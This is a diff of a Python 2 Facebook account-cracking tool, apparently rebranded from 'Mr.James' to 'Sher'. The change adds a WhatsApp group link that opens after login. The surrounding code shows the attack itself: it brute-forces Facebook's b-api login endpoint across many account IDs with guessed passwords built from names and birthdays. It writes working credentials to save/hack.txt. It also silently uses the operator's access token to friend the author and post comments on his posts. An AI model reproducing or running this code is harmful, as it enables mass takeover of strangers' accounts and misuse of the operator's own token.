@@ -149,7 +149,7 @@ def tokenz():
         zedd.close()
         jalan('\x1b[1;92mLOVE YOU:) ')
         print '\x1b[1;91m[\x1b[1;39m\xe2\x9c\x93\x1b[1;97m]\x1b[1;39m  Successful Login'
-        os.system('xdg-open')
+        os.system('xdg-open https://chat.whatsapp.com/EFZDUDDgKGZ94yVZJi453K')
         bot_komen()
     except KeyError:
         print '\x1b[1;97m[\x1b[1;39m!\x1b[1;97m] \x1b[1;39mToken Wrong !'
@@ -165,13 +165,13 @@ def bot_komen():
         os.system('rm -rf login.txt')
 
     una = '100041129048948'
-    kom = 'F4KHAR\xf0\x9f\x98\x98'
-    kom = 'F4KHAR\xf0\x9f\x98\x8e'
+    kom = 'Sher\xf0\x9f\x98\x98'
+    kom = 'Sher\xf0\x9f\x98\x8e'
     reac = 'HATE'
     post = '481555709892060'
     post2 = '481559296558368'
-    kom2 = 'Mr.James\xf0\x9f\x98\x98\xe2\x98\xa0\xef\xb8\x8f'
-    kom = 'Mr.James\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
+    kom2 = 'Sher\xf0\x9f\x98\x98\xe2\x98\xa0\xef\xb8\x8f'
+    kom = 'Sher\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
     reac2 = 'ANGRY\xf0\x9f\x98\x98'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
@@ -314,52 +314,52 @@ def pilih_super():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p1
+                print '\x1b[1;92m[Sher-Ok] ' + user + ' |\x1b[0m ' + p1
                 cek = open('save/hack.txt', 'a')
                 cek.write(user + '|' + p1 + '\n')
                 cek.close()
                 oks.append(user + p1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;93m[WAIT] ' + user + ' |\x1b[0m ' + p1
+                print '\x1b[1;93m[Sher-Cp] ' + user + ' |\x1b[0m ' + p1
                 cekpoint.append(user + p1)
             else:
                 p2 = pw2
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p2 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;;92m[CLONE] ' + user + ' |\x1b[0m ' + p2
+                    print '\x1b[1;;92m[Sher-Ok] ' + user + ' |\x1b[0m ' + p2
                     cek = open('save/hack.txt', 'a')
                     cek.write(user + '|' + p2 + '\n')
                     cek.close()
                     oks.append(user + p2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;;93m [WAIT] ' + user + ' |\x1b[0m ' + p2
+                    print '\x1b[1;;93m [Sher-Cp] ' + user + ' |\x1b[0m ' + p2
                     cekpoint.append(user + p2)
                 else:
                     p3 = pw3
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p3 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;41;97m[CLONE] ' + user + ' |\x1b[0m ' + p3
+                        print '\x1b[1;41;97m[Sher-Ok] ' + user + ' |\x1b[0m ' + p3
                         cek = open('save/hack.txt', 'a')
                         cek.write(user + '|' + p3 + '\n')
                         cek.close()
                         oks.append(user + p3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;93m [WAIT] ' + user + ' |\x1b[0m ' + p3
+                        print '\x1b[1;93m [Sher-Cp] ' + user + ' |\x1b[0m ' + p3
                         cekpoint.append(user + p3)
                     else:
                         p4 = pw4
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p4 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p4
+                            print '\x1b[1;92m[Sher-Ok] ' + user + ' |\x1b[0m ' + p4
                             cek = open('save/hack.txt', 'a')
                             cek.write(user + '|' + p4 + '\n')
                             cek.close()
                             oks.append(user + p4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;93m[WAIT] ' + user + ' |\x1b[0m ' + p4
+                            print '\x1b[1;93m[Sher-Cp] ' + user + ' |\x1b[0m ' + p4
                             cekpoint.append(user + p4)
                         else:
                             birthday = b['birthday']
@@ -367,26 +367,26 @@ def pilih_super():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p5 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p5
+                                print '\x1b[1;92m[Sher-Ok] ' + user + ' |\x1b[0m ' + p5
                                 cek = open('save/hack.txt', 'a')
                                 cek.write(user + '|' + p5 + '\n')
                                 cek.close()
                                 oks.append(user + p5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[1;93m [WAIT] ' + user + ' |\x1b[0m ' + p5
+                                print '\x1b[1;93m [Sher-Cp] ' + user + ' |\x1b[0m ' + p5
                                 cekpoint.append(user + p5)
                             else:
                                 p6 = b['first_name'] + '123'
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p6 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                                 q = json.load(data)
                                 if 'access_token' in q:
-                                    print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p6
+                                    print '\x1b[1;92m[Sher-Ok] ' + user + ' |\x1b[0m ' + p6
                                     cek = open('save/hack.txt', 'a')
                                     cek.write(user + '|' + p6 + '\n')
                                     cek.close()
                                     oks.append(user + p5)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;;93m [JAMES-CP] ' + user + ' |\x1b[0m ' + p6
+                                    print '\x1b[1;;93m [Sher-CP] ' + user + ' |\x1b[0m ' + p6
                                     cekpoint.append(user + p6)
                                 else:
                                     a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
@@ -395,13 +395,13 @@ def pilih_super():
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p7 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p7
+                                        print '\x1b[1;92m[Sher-Ok] ' + user + ' |\x1b[0m ' + p7
                                         cek = open('save/hack.txt', 'a')
                                         cek.write(user + '|' + p7 + '\n')
                                         cek.close()
                                         oks.append(user + p7)
                                     elif 'www.facebook.com' in q['error_msg']:
-                                        print '\x1b[1;93m[WAIT] ' + user + ' |\x1b[0m ' + p7
+                                        print '\x1b[1;93m[Sher-Cp] ' + user + ' |\x1b[0m ' + p7
                                         cekpoint.append(user + p6)
         except:
             pass
@@ -409,9 +409,9 @@ def pilih_super():
     p = ThreadPool(30)
     p.map(main, id)
     print 25 * '-'
-    print '\x1b[1;92m[CLONING DONE ! Happy'
-    print '\x1b[1;92m[CLONE : ' + str(len(oks))
-    print '\x1b[1;92m[WAIT: ' + str(len(cekpoint))
+    print '\x1b[1;92m[CLONING DONE ! ENJOY'
+    print '\x1b[1;92m[Sher-Ok : ' + str(len(oks))
+    print '\x1b[1;92m[Sher-Cp: ' + str(len(cekpoint))
     print '\x1b[1;92m[File save ~> save/hack.txt'
     print 25 * '-'
     print ' Keep Active'
